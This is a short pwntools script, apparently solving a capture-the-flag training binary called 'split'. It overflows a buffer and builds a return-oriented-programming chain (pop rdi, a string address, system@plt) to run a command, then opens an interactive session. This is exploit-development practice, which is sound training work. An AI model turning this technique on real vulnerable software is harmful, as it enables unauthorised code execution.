from pwn import *

exe = context.binary = ELF('split', checksec=False)
r = process(exe.path)

rop = ROP(exe)

offset = 40

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
useful_string = exe.sym['usefulString']
system_plt = exe.plt['system']
ret = rop.find_gadget(['ret'])[0]

payload = flat(
    b'A' * offset,
    ret,
    pop_rdi,
    useful_string,
    system_plt
)

r.sendline(payload)
r.interactive()
